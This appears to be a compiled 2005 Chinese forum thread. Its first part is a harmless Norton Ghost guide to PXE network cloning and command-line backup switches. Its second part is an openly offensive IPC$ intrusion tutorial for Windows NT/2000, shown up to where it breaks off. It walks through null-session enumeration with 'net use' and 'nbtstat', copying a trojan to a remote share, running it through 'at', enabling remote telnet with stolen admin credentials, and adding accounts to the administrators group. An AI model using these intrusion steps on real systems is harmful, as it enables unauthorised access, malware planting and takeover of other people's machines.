目前，相当多的电子教室都采用了没有软驱、光驱的工作站。在没有软驱、光驱的情况下，当硬盘的软件系统出现问题时，能否实现网络硬盘克隆呢？PXE（Preboot Execution Environment，它是基于 TCP/IP、DHCP、TFTP 等 Internet 协议之上的扩展网络协议）技术提供的从网络启动的功能，让我们找到了解决之道。下面，我们就来讲解怎样采用ghost 7.0来实现基于 PXE 的网络硬盘克隆。 

　　网络硬盘克隆过程简述 

　　网络硬盘克隆过程为：在装有软驱的工作站上，用一张引导盘来启动机器，连接到服务器，使用 ghost 多播服务（Multicast Server）将硬盘或分区的映像克隆到工作站，这样就实现了不拆机、安全、快速的网络硬盘克隆。 

　　实现 PXE 网络启动方式 

　　对于没有软驱、光驱的工作站，要实现PXE网络启动方式，需要完成三个步骤： 

　　1、工作站的PXE启动设置 

　　PXE网络启动一般要求在网卡上加装 PXE 启动芯片（PXE Boot ROM）；对于某些型号的网卡，也可以将 PXE 启动代码（Boot Code）写入主板的 Flash ROM；而一些主板上集成了网卡的品牌机（例如清华同方的商用机），可直接支持PXE启动。 

　　常用的 RTL8139 芯片的网卡，其 PXE 启动设置方式是：机器启动时根据屏幕提示按下Shift+F10，在启动类型中选择PXE，开启网络启动选项即可。 


GHOST详细解说（2） 


2、制作 PXE 启动文件 

　　制作 PXE 的启动文件，推荐使用 3Com 的 DABS（Dynamic Access Boot Services）。DABS 提供了功能强大的 PXE 启动服务、管理功能，但是，网上可供下载的是一个30天的试用版。所以，我们只用它的启动映像文件制作功能，而由 Windows 2000 Server 的 DHCP 服务器来提供 PXE 启动服务。 

　　DABS 可以安装在任何一台运行 Windows 的机器上。安装后，运行 3Com Boot Image Editor，出现主界面图。选择“创建TCP/IP或PXE映像文件（Create a TCP/IP or PXE image file）”，出现对话窗口。为即将建立的映像文件命名，例如：pxeghost.img，其他采用默认选项，将经测试正常的网络启动盘放入软驱，选择[OK]，创建PXE启动映像 Pxeghost.img文件。 

　　在 3Com Boot Image Editor 的主菜单中，选择“创建PXE菜单启动文件（Creat a PXE menu boot file）”，在出现的窗口中选择[添加（Add）]，加入我们刚刚创建的启动映像文件Pxeghost.img，在“选项（Options）”标签中可以设置菜单标题和等待时间。 

　　选择[保存（Save）]，给保存的PXE菜单启动文件命名为 Pxemenu.pxe。 

　　3、服务器的PXE启动服务设置 

　　Windows 2000 Server 的 DHCP 服务支持两种启动协议：DHCP 和 BOOTP。我们可以设定以下三种选择：仅 DHCP、仅 BOOTP、两者。如果我们的局域网中由其他的 DHCP 服务器提供动态 IP 地址分配，那么这里选“仅BOOTP”即可；如果需要这台服务器提供动态 IP 地址分配，则需要选“两者”。 

　　接下来，设置启动文件名。在DHCP服务器的作用域选项中配置选项“067:启动文件名”，字串值为我们创建的 PXE 菜单启动文件名 Pxemenu.pxe。注意：文件名不包含路径。 

　　DHCP 服务器只是将启动文件名通知给 BOOTP 客户机，客户机通过什么方式下载启动文件呢？答案是，需要 TFTP 服务。3Com 的 DABS 包含了一个 TFTP 服务组件，当然，也可以下载一个免费的 TFTP 服务器软件长期使用。 

　　在 TFTP 服务器的设置中，规定一个服务目录。将制作的 PXE 启动文件 Pxeghost.img、Pxemenu.pxe 放到 TFTP 的服务目录中。TFTP 服务器设置为自动运行。 

　　用 ghost 多播克隆硬盘 

　　现在运行 ghost 多播服务器，任务名称为 Restore。设置完毕，按下[接受客户（Accept Clients）]按钮。启动要接受硬盘克隆的无软驱工作站，如果以上步骤操作无误，应该能够实现 PXE 启动，加入到多播克隆的任务当中。所有的目标工作站连接到本次任务之后，按下[发送（Send）]按钮，开始克隆任务。
五、参数设置
在 Options 中可以设置参数。下面简单介绍一下:
1．image write buffering：在建立备份文件时, 打开写缓冲；
2．sure：选择此项后, 不再会出现最终确认询问 (建议不要选择此项)；
3．no int 13：选择此项后, 不支持中断 13 (缺省时不选择)；
4．reboot：在对硬盘或者分区操作完成之后, 自动重启计算机；
5．spanning：通过多个卷架构备份文件 (选择此项时, 关闭 write buffering)；
6．autoname：自动为 spanning 文件命名；
7．allow 64k fat clusters：允许使用 64K FAT 簇 (仅在 Windows NT 中支持)；
8．ignore CRC errors：忽略 CRC 错误；
9．override size limit：如果出现分区大小不相配, 可忽略执行；
10．image read buffering：打开生成备份文件时的读缓存 (缺省时选中此项)。 


六、软件特性 

1.存贮介质
　　ghost 支持的存储介质超出了我们的想象，它支持对等 LPT 接口、对等 USB 接口、对等 TCP/IP 接口、SCSI磁带机、便携式设备（JAZ、ZIP、MO等）、光盘刻录机（CDR、CDRW）等。而这些特性不需要任何外带的驱动程序和软件，只需一张软盘就可以做到！特别是对光盘刻录机的支持，如今的刻录机和空白光盘都十分便宜，非常适合作备份的用途。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:59am 

GHOST详细解说（3） 


2.兼容性 
　　ghost 对现有的操作系统都有良好的支持，包括 FAT16、FAT32、NTFS、HPFS、UNIX、NOVELL 等文件存储格式。同以前版本不同的是，ghost 2001 加入了对 Linux EX2的支持（FIFO 文件存储格式），这也就意味着 Linux 的用户也可以用 ghost 来备份系统了。 

3.配套软件 

　　A.ghost 浏览器
在以前的 ghost版本中，我们只能对整个系统进行简单的备份、复制、还原，要恢复单个的文件和文件夹还要使用外带的 GhostEXP 软件。现在，Symantec 公司已经将 ghost 浏览器整合在软件中。ghost 浏览器采用类似于资源管理器的界面，通过它，我们可以方便迅速地在备份包中找出我们想要的文件和文件夹并还原。
使用Explorer可以备份整个硬盘或单个硬盘分区，点击工具栏上的圆柱形图标，弹出硬盘或分区选择对话窗口，然后再选择备份文件的储存目录并输入名称即可完成。要注意的是，非注册用户不能使用备份这项功能。
在 ghost Explorer 中管理硬盘备份文件就非常方便了。首先选择打开一个备份文件(File/Open)，这时备份中的文件就像资源管理器一样在程序界面窗口中列出，可以在其中非常方便地查看、打开文件，也可以查找文件，或者将某个文件删除(但不能删除目录)。
在 ghost Explorer 中提供了多种还原硬盘备份文件的方法，最方便的方法是使用鼠标右键点击某个文件，在弹出菜单中选择 Restore，然后输入要还原到的目录，这样，单个文件就从整个磁盘备份中还原出来了。当然，如果要还原整个磁盘备份，只需选择左面目录列表栏中最上面的带磁盘图标的目录项，然后点击工具栏中的还原图标 (第二个) 就可以了。 

B.GDisk
GDisk 是一个新加入的实用工具，它彻底取代了 FDisk 和 format，功能有： 
* 快速格式化。
* ######和显示分区。此功能允许一个以上的主 DOS分区，并且每个分区上的操作系统有不同的版本。######分区的能力使计算机习惯于引导到选定的可引导分区，忽略其他######分区中相同操作系统的安装。 
* 全面的分区报告。 
* 高度安全的磁盘擦除。提供符合美国国防部标准和更高安全标准的磁盘擦除选项。 
与使用交互式菜单的 FDisk 不同，GDisk是由命令行驱动的。这提供了更快的配置磁盘分区和在批处理文件中定义 GDisk操作的能力。但与此同时，几十个参数会令普通用户头疼，因此笔者不推荐一般用户使用，Symantec 公司也应该推出相应的GUI（图形用户界面）控制台以方便用户使用。具体的参数说明可以用命令行 gdisk/? 了解。 

C.Live Update
Live Update 是 Symantec公司软件的一个通用升级程序，它能够检查当前系统中已安装的 Symantec 软件，并且通过英特网对软件进行在线升级。 
在安装 ghost 2001 时，安装程序自动升级了 Live Update 程序的版本。 


七、命令行参数：（ghost 的无人 备份/恢复/复制 操作） 

　　其实 ghost 2001 的功能远远不止它主程序中显示的那些，ghost 可以在其启动的命令行中添加众多参数以实现更多的功能。命令行参数在使用时颇为复杂，不过我们可以制作批处理文件，从而“一劳永逸”（类似于无人安装 Windows 98 和Windows 2000）。现在让我们来了解一些常用的参数（了解更加详细的参数介绍可查看 ghost 的帮助文件）。 
1.-rb 
本次 ghost 操作结束退出时自动重启。这样，在复制系统时就可以放心离开了。 
2.-fx 
本次 ghost 操作结束退出时自动回到DOS提示符。 
3.-sure 
对所有要求确认的提示或警告一律回答“Yes”。此参数有一定危险性，只建议高级用户使用。 
4.-fro 
如果源分区发现坏簇，则略过提示而强制拷贝。此参数可用于试着挽救硬盘坏道中的数据。
5.@filename 
在 filename 中指定 txt 文件。txt文件中为 ghost 的附加参数，这样做可以不受DOS命令行 150 个字符的限制。 
6.-f32 
将源 FAT16 分区拷贝后转换成 FAT32（前提是目标分区不小于 2G）。WinNT 4 和Windows95、97用户慎用。 
7.-bootcd 
当直接向光盘中备份文件时，此选项可以使光盘变成可引导。此过程需要放入启动盘。 
8.-fatlimit 
将 NT 的 FAT16 分区限制在 2G。此参数在复制 Windows NT 分区，且不想使用64k/簇的 FAT16 时非常有用。 
9.-span 
分卷参数。当空间不足时提示复制到另一个分区的另一个备份包。
10.-auto 
分卷拷贝时不提示就自动赋予一个文件名继续执行。 
11.-crcignore 
忽略备份包中的 CRC ERROR。除非需要抢救备份包中的数据，否则不要使用此参数，以防数据错误。 
12.-ia 
全部映像。ghost 会对硬盘上所有的分区逐个进行备份。 
13.-ial 
全部映像，类似于 -ia 参数，对 Linux 分区逐个进行备份。 
14.-id 
全部映像。类似于 -ia 参数，但包含分区的引导信息。 
15.-quiet 
操作过程中禁止状态更新和用户干预。 
16.-script 
可以执行多个 ghost 命令行。命令行存放在指定的文件中。
17.-split=x 
　　将备份包划分成多个分卷，每个分卷的大小为 x兆。这个功能非常实用，用于大型备份包复制到移动式存储设备上，例如将一个 1.9G 的备份包复制到 3 张刻录盘上。 
18.-z 
　　将磁盘或分区上的内容保存到映像文件时进行压缩。-z 或 -z1 为低压缩率（快速）；-z2 为高压缩率（中速）；-z3 至 -z9 压缩率依次增大（速度依次减慢）。 
19.-clone 
　　这是实现 ghost 无人备份/恢复的核心参数。使用语法为： 
-clone,MODE=(operation),SRC=(source),DST=(destination),[SZE(size),SZE(size)...] 
此参数行较为复杂，且各参数之间不能含有空格。其中 operation意为操作类型，值可取：copy：磁盘到磁盘；load：文件到磁盘；dump：磁盘到文件；pcopy：分区到分区；pload：文件到分区；pdump：分区到文件。
　　Source 意为操作源，值可取：驱动器号，从1开始；或者为文件名，需要写绝对路径。 
Destination 意为目标位置，值可取：驱动器号，从 1开始；或者为文件名，需要写绝对路径；@CDx，刻录机，x 表示刻录机的驱动器号，从1开始。 

下面举例说明： 

1.命令行参数：ghostpe.exe -clone,mode=copy,src=1,dst=2 
完成操作：将本地磁盘1复制到本地磁盘2。 

2.命令行参数：ghostpe.exe -clone,mode=pcopy,src=1:2,dst=2:1 
完成操作：将本地磁盘1上的第二分区复制到本地磁盘2的第一分区。 

3.命令行参数：ghostpe.exe-clone,mode=load,src=g:\3prtdisk.gho,dst=1,sze1=450M,sze2=1599M,sze3=2047M 
完成操作：从映像文件装载磁盘1，并将第一个分区的大小调整为450MB，第二个调整为1599MB，第三个调整为2047MB。 

4.命令行参数：ghostpe.exe -clone,mode=pdump,src2:1:4:6,dst=d:\prt246.gho 
完成操作：创建仅含有选定分区的映像文件。从磁盘2上选择分区1、4、6。 

八、一些示例
ghost.exe -clone,mode=copy,src=1,dst=2 -sure
硬盘对拷 

ghost.exe -clone,mode=pcopy,src=1:2,dst=2:1 -sure
将一号硬盘的第二个分区复制到二号硬盘的第一个分区 

ghost.exe -clone,mode=pdump,src=1:2,dst=g:\bac.gho
将一号硬盘的第二个分区做成映像文件放到 g 分区中 

ghost.exe -clone,mode=pload,src=g:\bac.gho:2,dst=1:2
从内部存有两个分区的映像文件中，把第二个分区还原到硬盘的第二个分区 

ghost.exe -clone,mode=pload,src=g:\bac.gho,dst=1:1 -fx -sure -rb
用 g 盘的 bac.gho 文件还原 c 盘。完成后不显示任何信息，直接启动 

ghost.exe -clone,mode=load,src=g:\bac.gho,dst=2,SZE1=60P,SZE2=40P
将映像文件还原到第二个硬盘，并将分区大小比例修改成 60:40 

自动还原磁盘：
首先做一个启动盘，包含 Config.sys, Autoexec.bat, Command.com, Io.sys, ghost.exe 文件(可以用 windows 做启动盘的程序完成)。Autoexec.bat 包含以下命令：
ghost.exe -clone,mode=pload,src=d:\bac.gho,dst=1:1 -fx -sure -rb
利用在 D 盘的文件自动还原，结束以后自动退出 ghost 并且重新启动。 

自动备份磁盘：
ghost.exe -clone,mode=pdump,src=1:1,dst=d:\bac.gho -fx -sure -rb 

自动还原光盘：
包含文件：Config.sys, Autoexec.bat, Mscdex.exe (CDROM 执行程序), Oakcdrom.sys (ATAPI CDROM 兼容驱动程序), ghost.exe。
Config.sys 内容为：
DEVICE=OAKCDROM.SYS /D:IDECD001
Autoexec.bat 内容为：
MSCDEX.EXE /D:IDECE001 /L:Z
ghost -clone,mode=load,src=z:\bac.gho,dst=1:1 -sure -rb 

可以根据下面的具体说明修改示例： 

1.-clone 

-clone 在使用时必须加入参数，它同时也是所有的 switch{batch switch} 里最实用的。下面是 clone 所定义的参数： 

mode={copy|load|dump|pcopy|pload|pdump},
src={drive|file|driveartition},
dst={drive|file|driveartition} 

mode 指定要使用哪种 clone 所提供的命令 
copy 硬盘到硬盘的复制 (disk to disk copy) 
load 文件还原到硬盘 (file to disk load) 
dump 将硬盘做成映像文件 (disk to file dump) 
pcopy 分区到分区的复制 (partition to partition copy) 
pload 文件还原到分区 (file to partition load) 
pdump 分区备份成映像文件（partition to file dump) 

src 指定了 ghost 运行时使用的源分区的位置模式及其意义。对应 mode 命令 src 所使用参数例子:
COPY/DUMP 源硬盘号。以 1 代表第一号硬盘
LOAD 映像文件名。g:/back98/setup98.gho 或装置名称 (drive）
PCOPY/PDUMP 源分区号。1:2 代表的是硬盘１的第二个分区
PLOAD 分区映像文件名加上分区号或是驱动器名加上分区号。g:\back98.gho:2 代表映像文件里的第二个分区 

dst 指定运行 ghost 时使用的目标位置模式及其意义。对应 mode 命令 dst 所使用参数例子： 
COPY/DUMP 目的硬盘号。2 代表第二号硬盘
LOAD 硬盘映像文件名。例 g:\back98\setup98.gho 
PCOPY/PLOAD 目的分区号。2:2 代表硬盘 2 的第二个分区
PDUMP 分区映像文件名加分区号。g:\back98\setup98.gho:2 
SZEn 指定所使用目的分区的大小：
n=xxxxM 指定第 n 目的分区的大小为 xxxxMB。如 SZE2=800M 表示分区 2 的大小为 800MB 
n=mmP 指定第 n 目的分区的大小为整个硬盘的 mm 个百分比。 

2.-fxo 当源物件出现坏块时，强迫复制继续进行 

3.-fx 当ghost完成新系统的工作后不显示 press ctrl-alt-del to reboot 直接回到DOS下 

4.-ia 完全执行扇区到扇区的复制。当由一个映像文件或由另一个硬盘为来源，复制一个分区时，ghost将首先检查来源分区，再决定是要复制文件和目录结构还是要做映像复制(扇区到扇区)。预设是这种形式。但是有的时候，硬盘里特定的位置可能会放一些######的与系统安全有关的文件。只有用扇区到扇区复制的方法才能正确复制 

5.-pwd and -pwd=x 给映像文件加密 

6.-rb 在还原或复制完成以后，让系统重新启动 

7.-sure 可以和 clone 合用。ghost 不会显示 proceed with disk clone-destination drive will be overwritten? 提示信息 

九、注意事项 

1.在备份系统时，单个的备份文件最好不要超过 2GB。 
2.在备份系统前，最好将一些无用的文件删除以减少ghost文件的体积。通常无用的文件有：Windows 的临时文件夹、IE 临时文件夹、Windows 的内存交换文件。这些文件通常要占去100 多兆硬盘空间。 
3.在备份系统前，整理目标盘和源盘，以加快备份速度。 
4.在备份系统前及恢复系统前，最好检查一下目标盘和源盘，纠正磁盘错误。 
5.在恢复系统时，最好先检查一下要恢复的目标盘是否有重要的文件还未转移，千万不要等硬盘信息被覆盖后才后悔莫及啊。 
6.在选择压缩率时，建议不要选择最高压缩率，因为最高压缩率非常耗时，而压缩率又没有明显的提高。 
7.在新安装了软件和硬件后，最好重新制作映像文件，否则很可能在恢复后出现一些莫名其妙的错误。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:59am 

ipc$详细解说大全（1） 

一 前言
二 什么是ipc$
三 什么是空会话
四 空会话可以做什么
五 ipc$连接所使用的端口
六 ipc$连接在hack攻击中的意义
七 ipc$连接失败的常见原因
八 复制文件失败的原因
九 如何打开目标的IPC$共享以及其他共享
十 一些需要shell才能完成的命令
十一 入侵中可能会用到的相关命令
十二 ipc$完整入侵步骤祥解
十三 如何防范ipc$入侵
十四 ipc$入侵问答精选
十五 结束的话 




一 前言 

网上关于ipc$入侵的文章可谓多如牛毛，而且也不乏优秀之作，攻击步骤甚至可以说已经成为经典的模式，因此也没人愿意再把这已经成为定式的东西拿出来摆弄。
不过话虽这样说，但我个人认为这些文章讲解的并不详细，对于第一次接触ipc$的菜鸟来说，简单的罗列步骤并不能解答他们的种种迷惑（你随便找一个hack论坛搜一下ipc$，看看存在的疑惑有多少）。因此我参考了网上的一些资料，教程以及论坛帖子，写了这篇总结性质的文章，想把一些容易混淆，容易迷惑人的问题说清楚，让大家不要总徘徊在原地!
注意：本文所讨论的各种情况均默认发生在win NT/2000环境下，win98将不在此次讨论之列，而鉴于win Xp在安全设置上有所提高，个别操作并不适用，有机会将单独讨论。 


二 什么是ipc$ 


IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。IPC$是NT/2000的一项新功能，它有一个特点，即在同一时间内，两个IP之间只允许建立一个连接。NT/2000在提供了ipc$功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(c$,d$,e$……)和系统目录winnt或windows(admin$)共享。所有的这些，微软的初衷都是为了方便管理员的管理，但在有意无意中，导致了系统安全性的降低。
平时我们总能听到有人在说ipc$漏洞，ipc$漏洞，其实ipc$并不是一个真正意义上的漏洞,我想之所以有人这么说，一定是指微软自己安置的那个‘后门’：空会话（Null session）。那么什么是空会话呢？ 



三 什么是空会话 


在介绍空会话之前，我们有必要了解一下一个安全会话是如何建立的。
在Windows NT 4.0中是使用挑战响应协议与远程机器建立一个会话的，建立成功的会话将成为一个安全隧道，建立双方通过它互通信息，这个过程的大致顺序如下： 
1）会话请求者（客户）向会话接收者（服务器）传送一个数据包，请求安全隧道的建 
立； 
2）服务器产生一个随机的64位数（实现挑战）传送回客户； 
3）客户取得这个由服务器产生的64位数，用试图建立会话的帐号的口令打乱它，将结 
果返回到服务器（实现响应）； 
4）服务器接受响应后发送给本地安全验证（LSA），LSA通过使用该用户正确的口令来核实响应以便确认请求者身份。如果请求者的帐号是服务器的本地帐号，核实本地发生；如果请求的帐号是一个域的帐号，响应传送到域控制器去核实。当对挑战的响应核实为正确后，一个访问令牌产生，然后传送给客户。客户使用这个访问令牌连接到服务器上的资源直到建议的会话被终止。
以上是一个安全会话建立的大致过程，那么空会话又如何呢？ 

空会话是在没有信任的情况下与服务器建立的会话（即未提供用户名与密码），但根据WIN2000的访问控制模型，空会话的建立同样需要提供一个令牌，可是空会话在建立过程中并没有经过用户信息的认证，所以这个令牌中不包含用户信息，因此，这个会话不能让系统间发送加密信息，但这并不表示空会话的令牌中不包含安全标识符SID（它标识了用户和所属组），对于一个空会话，LSA提供的令牌的SID是S-1-5-7，这就是空会话的SID，用户名是：ANONYMOUS LOGON（这个用户名是可以在用户列表中看到的，但是是不能在SAM数据库中找到，属于系统内置的帐号），这个访问令牌包含下面伪装的组： 
Everyone 
Network
在安全策略的限制下，这个空会话将被授权访问到上面两个组有权访问到的一切信息。那么建立空会话到底可以作什么呢？ 


四 空会话可以做什么 


对于NT，在默认安全设置下，借助空连接可以列举目标主机上的用户和共享，访问everyone权限的共享，访问小部分注册表等，并没有什么太大的利用价值；对2000作用更小，因为在Windows 2000 和以后版本中默认只有管理员和备份操作员有权从网络访问到注册表，而且实现起来也不方便，需借助工具。从这些我们可以看到，这种非信任会话并没有多大的用处，但从一次完整的ipc$入侵来看，空会话是一个不可缺少的跳板，因为我们从它那里可以得到户列表，这对于一个老练的黑客已经足够了。以下是空会话中能够使用的具体命令： 


1 首先，我们先建立一个空会话（需要目标开放ipc$）
命令：net use \\ip\ipc$ "" /user:""
注意：上面的命令包括四个空格，net与use中间有一个空格，use后面一个，密码左右各一个空格。 


2 查看远程主机的共享资源
命令：net view \\IP 
解释：建立了空连接后，用此命令可以查看远程主机的共享资源，如果它开了共享，可以得到如下类似类似结果：
在 \\*.*.*.*的共享资源
资源共享名 类型 用途 注释
pc$详细解说大全（2） 

NETLOGON Disk Logon server share
SYSVOL Disk Logon server share
命令成功完成。 


3 查看远程主机的当前时间
命令：net time \\IP 
解释：用此命令可以得到一个远程主机的当前时间。 


4 得到远程主机的NetBIOS用户名列表（需要打开自己的NBT）
nbtstat -A IP 
用此命令可以得到一个远程主机的NetBIOS用户名列表（需要你的netbios支持），返回如下结果： 

Node IpAddress: [*.*.*.*] Scope Id: [] 

NetBIOS Remote Machine Name Table 

Name Type Status
---------------------------------------------
SERVER <00> UNIQUE Registered
OYAMANISHI-H <00> GROUP Registered
OYAMANISHI-H <1C> GROUP Registered
SERVER <20> UNIQUE Registered
OYAMANISHI-H <1B> UNIQUE Registered
OYAMANISHI-H <1E> GROUP Registered
SERVER <03> UNIQUE Registered
OYAMANISHI-H <1D> UNIQUE Registered
..__MSBROWSE__.<01> GROUP Registered
INet~Services <1C> GROUP Registered
IS~SERVER......<00> UNIQUE Registered 

MAC Address = 00-50-8B-9A-2D-37 

以上就是我们经常使用空会话做的事情，好像也能获得不少东西哟，不过要注意一点：建立IPC$连接的操作会在EventLog中留下记录，不管你是否登录成功。 好了，那么下面我们就来看看ipc$所使用的端口是什么？ 




五 ipc$所使用的端口 


首先我们来了解一些基础知识：
1 SMB:(Server Message Block) Windows协议族，用于文件打印共享的服务；
2 NBT:(NETBios Over TCP/IP)使用137（UDP）138（UDP）139（TCP）端口实现基于TCP/IP协议的NETBIOS网络互联。
3 在WindowsNT中SMB基于NBT实现，而在Windows2000中，SMB除了基于NBT实现，还可以直接通过445端口实现。 

有了这些基础知识，我们就可以进一步来讨论访问网络共享对端口的选择了： 

对于win2000客户端来说：
1 如果在允许NBT的情况下连接服务器时，客户端会同时尝试访问139和445端口，如果445端口有响应，那么就发送RST包给139端口断开连接，用455端口进行会话，当445端口无响应时，才使用139端口，如果两个端口都没有响应，则会话失败；
2 如果在禁止NBT的情况下连接服务器时，那么客户端只会尝试访问445端口，如果445端口无响应，那么会话失败。由此可见，禁止了NBT后的win 2000对win NT的共享访问将会失败。 


对于win2000服务器端来说：
1 如果允许NBT, 那么UDP端口137, 138, TCP 端口 139, 445将开放；
2 如果禁止NBT，那么只有445端口开放。 


我们建立的ipc$会话对端口的选择同样遵守以上原则。显而易见，如果远程服务器没有监听139或445端口，ipc$会话是无法建立的。 


六 ipc$连接在hack攻击中的意义 


就像上面所说的，即使你建立了一个空的连接，你也可以获得不少的信息（而这些信息往往是入侵中必不可少的），如果你能够以某一个具有一定权限的用户身份登陆的话，那么你就会得到相应的权限，显然，如果你以管理员身份登陆,嘿嘿,那你可就了不得了，基本上可以为所欲为了。不过你也不要高兴的太早，因为管理员的密码不是那么好搞到的，虽然会有一些粗心的管理员存在弱口令，但这毕竟是少数，而且现在不比从前了，随着人们安全意识的提高，管理员们也愈加小心了，得到管理员密码将会越来越难的，因此今后你最大的可能就是以极小的权限甚至是没有权限进行连接，甚至在主机不开启ipc$共享时，你根本就无法连接，你会慢慢的发现ipc$连接并不是万能的，所以不要奢望每次连接都能成功，那是不现实的。
是不是有些灰心？倒也不用,关键是我们要摆正心态，不要把ipc$入侵当作终极武器，不要认为它战无不胜,它只是很多入侵方法中的一种，你有可能利用它一击必杀，也有可能一无所获，这些都是正常的，在黑客的世界里，不是每条大路都能通往罗马，但总有一条路会通往罗马，耐心的寻找吧！ 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:00pm 

ipc$详细解说大全（3） 

七 ipc$连接失败的常见原因 

以下是一些常见的导致ipc$连接失败的原因： 


1 IPC连接是Windows NT及以上系统中特有的功能，由于其需要用到Windows NT中很多DLL函数，所以不能在Windows 9.x/Me系统中运行，也就是说只有nt/2000/xp才可以相互建立ipc$连接，98/me是不能建立ipc$连接的； 


2 如果想成功的建立一个ipc$连接，就需要对方开启ipc$共享，即使是空连接也是这样，如果对方关闭了ipc$共享，你将会建立失败； 


3 你未启动Lanmanworkstation服务，它提供网络链结和通讯，没有它你无法发起连接请求（显示名为：Workstation）； 


4 对方未启动Lanmanserver服务，它提供了 RPC 支持、文件、打印以及命名管道共享，ipc$依赖于此服务，没有它远程主机将无法响应你的连接请求（显示名为：Server）； 


5 对方未启动NetLogon，它支持网络上计算机 pass-through 帐户登录身份； 


6 对方禁止了NBT（即未打开139端口）； 


7 对方防火墙屏蔽了139和445端口； 


8 你的用户名或者密码错误（显然空会话排除这种错误）； 


9 命令输入错误：可能多了或少了空格，当用户名和密码中不包含空格时两边的双引号可以省略，如果密码为空，可以直接输入两个引号""即可； 


10 如果在已经建立好连接的情况下对方重启计算机，那么ipc$连接将会自动断开，需要重新建立连接。 


另外,你也可以根据返回的错误号分析原因： 
错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限； 
错误号51，Windows无法找到网络路径：网络有问题； 
错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； 
错误号67，找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； 
错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； 
错误号1326，未知的用户名或错误密码：原因很明显了； 
错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；
错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。 




八 复制文件失败的原因 


有些朋友虽然成功的建立了ipc$连接，但在copy时却遇到了这样那样的麻烦，无法复制成功，那么导致复制失败的常见原因又有哪些呢？ 


1 盲目复制
这类错误出现的最多，占到50%以上。许多朋友甚至都不知道对方是否有共享文件夹，就进行盲目复制，结果导致复制失败而且郁闷的很。因此我建议大家在进行复制之前务必用net view \\IP这个命令看一下对方的共享情况，不要认为ipc$连接建立成功了就一定有共享文件夹。 


2 默认共享判断错误
这类错误也是大家经常犯的，主要有两个小方面： 

1）错误的认为能建立ipc$连接的主机就一定开启了默认共享，因而在建立完连接之后马上向admin$之类的默认共享复制文件，导致复制失败。ipc$连接成功只能说明对方打开了ipc$共享，ipc$共享与默认共享是两码事，ipc$共享是一个命名管道，并不是哪个实际的文件夹，而默认共享并不是ipc$共享的必要条件； 

2）由于net view \\IP 无法显示默认共享（因为默认共享带$），因此通过这个命令，我们并不能判断对方是否开启了默认共享，因此如果对方未开启默认共享，那么所有向默认共享进行的操作都不能成功；（不过大部分扫描软件在扫弱口令的同时，都能扫到默认共享目录，可以避免此类错误的发生） 


3用户权限不够，包括四种情形：
1）空连接向所有共享（默认共享和普通共享）复制时，大多情况下权限是不够的；
2）向默认共享复制时，要具有管理员权限；
3）向普通共享复制时，要具有相应权限（即对方事先设定的访问权限）；
4）对方可以通过防火墙或安全软件的设置，禁止外部访问共享； 

还需要说明一点：不要认为administrator就一定是管理员，管理员名称是可以改的。 


4被防火墙杀死或在局域网
也许你的复制操作已经成功，但当远程运行时，被防火墙杀掉了，导致找不到文件；还有可能你把木马复制到了局域网内的主机，导致连接失败。因此建议你复制时要小心，否则就前功尽弃了。 


呵呵，大家也知道，ipc$连接在实际操作过程中会出现千奇百怪的问题，上面我所总结的只是一些常见错误，没说到的，只能让大家自己去体会了。 


九 如何打开目标的IPC$共享以及其他共享 


目标的ipc$不是轻易就能打开的，否则就要天下打乱了。你需要一个admin权限的shell,比如telnet,木马等，然后在shell下执行net share ipc$来开放目标的ipc$，用net share ipc$ /del来关闭共享。如果你要给它开共享文件夹，你可以用net share baby=c:\，这样就把它的c盘开为共享名为baby共享了。 


十 一些需要shell才能完成的命令 


看到很多教程这方面写的十分不准确，一些需要shell才能完成命令就简简单单的在ipc$连接下执行了，起了误导作用。那么下面我总结一下需要在shell才能完成的命令： 

1 向远程主机建立用户，激活用户，修改用户密码，加入管理组的操作需要在shell下完成； 

2 打开远程主机的ipc$共享，默认共享，普通共享的操作需要在shell下完成； 

3 运行/关闭远程主机的服务，需要在shell下完成； 

4 启动/杀掉远程主机的进程，也需要在shell下完成。 


十一 入侵中可能会用到的相关命令 


请注意命令适用于本地还是远程，如果适用于本地，你只能在获得远程主机的shell后，才能向远程主机执行。 

1 建立空连接:
net use \\IP\ipc$ "" /user:"" 

2 建立非空连接:
net use \\IP\ipc$ "psw" /user:"account" 

3 查看远程主机的共享资源（但看不到默认共享）
net view \\IP 

4 查看本地主机的共享资源（可以看到本地的默认共享）
net share 

5 得到远程主机的用户名列表
nbtstat -A IP 

6 得到本地主机的用户列表
net user 

7 查看远程主机的当前时间
net time \\IP 

8 显示本地主机当前服务
net start 

9 启动/关闭本地服务
net start 服务名 /y
net stop 服务名 /y 

10 映射远程共享:
net use z: \\IP\baby
此命令将共享名为baby的共享资源映射到z盘 

11 删除共享映射
net use c: /del 删除映射的c盘，其他盘类推 
net use * /del /y删除全部 

12 向远程主机复制文件
copy \路径\srv.exe \\IP\共享目录名，如：
copy ccbirds.exe \\*.*.*.*\c 即将当前目录下的文件复制到对方c盘内 

13 远程添加计划任务
at \\ip 时间 程序名，如：
at \\127.0.0.0 11:00 love.exe
注意：时间尽量使用24小时制；在系统默认搜索路径（比如system32/）下不用加路径，否则必须加全路径 


14 开启远程主机的telnet
这里要用到一个小程序：opentelnet.exe，各大下载站点都有，而且还需要满足四个要求： 

1）目标开启了ipc$共享
2）你要拥有管理员密码和帐号
3）目标开启RemoteRegistry服务，用户就该ntlm认证
4）对WIN2K/XP有效，NT未经测试
命令格式：OpenTelnet.exe \\server account psw NTLM认证方式 port
试例如下：c:\>OpenTelnet.exe \\*.*.*.* administrator "" 1 90 

15 激活用户/加入管理员组
1 net uesr account /active:yes
2 net localgroup administrators account /add 

16 关闭远程主机的telnet
